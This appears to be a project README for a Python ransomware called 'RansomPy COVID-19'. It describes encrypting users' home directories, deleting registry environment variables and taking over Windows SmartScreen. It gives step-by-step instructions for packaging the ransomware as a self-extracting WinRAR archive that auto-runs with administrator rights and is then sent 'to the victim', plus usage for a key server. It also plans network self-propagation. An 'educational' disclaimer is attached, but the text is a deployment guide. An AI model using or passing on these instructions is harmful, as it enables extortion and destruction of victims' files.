# RansomPy COVID-19
Ransowmare based on Python 3 [3.7 version] created during containment...

The code is constantly improving, this for educational purposes to learn how a Ransomware works.
I am in no way responsible for what you will do with this code.

# Program Operation 
The code is buildable in several stages but is essentially intended to encrypt the files in a Windows system and is compiled with Cx_Freeze which allows to import all the Ransomware libraries.

Using Cx_Freeze is relatively simple, you can consult the official documentation at this address:
https://cx-freeze.readthedocs.io/en/latest/

You can also run the code without compiling it, it will be necessary that the target has Python installed on the system, however it is preferable to compile it for automation after creating an SFX package with Winrar, Inno Setup or a Windows installation package (MSI).

# Details
Ransomware encrypts all home directories in the system. 
It also removes all environment variables in the registry, before taking possession of some executables in "system32" such as "SmartScreen" allowing the verification of the editor before running a program on the system.
It requires administrator rights to start correctly, and if you don't have the rights, then it will be restarted automatically by making a privilege request.
If the program does not connect to the server to get the encryption key for the files, then it generates the key and sends it by e-mail relay.

# Auto-exec with WinRAR
1. Select the folder contains the code and libraries 
2. Rename the folder to "setup"
3. Right Click and "Add to archive"
4. Select "Create SFX Archive"
5. In the "Advanced tab" click on "SFX Options"
6. Select "Create in the current folder"
7. Copy "Powershell Start-Process setup/main.exe -Verb RunAs" in the "Launch after installation" section.
8. In the "Advanced tab" on "SFX Options" check the box "Request Administrative Rights" (Very important, it allows you to run ransomware as an administrator)
9. Click OK
10. Send the "SFX Archive" to the victim.

The advantage of this method of building an archive is that I do not need to request privileges in the code and it also makes it possible to contain all the libraries in a single executable file.

Beware sometimes antivirus programs like Windows Defender can detect a simple SFX archive which is actually a false positive.

# Installer with Inno Setup
You can consult the official documentation at https://jrsoftware.org/.
The purpose of inno setup is to create an installer by adding some parameters such as the destination folder or a personalized icon. 

# Execution script on the Server
For use the script : python ServerKey.py --host <ip_adress> --port <port_number>

# Improvements to come
The program will encrypt the removable media connected to the target machine.

The program will encrypt much faster with the use of threads and the encrypt in binary.

The program will be able to search and exploit a network communication to propagate itself.
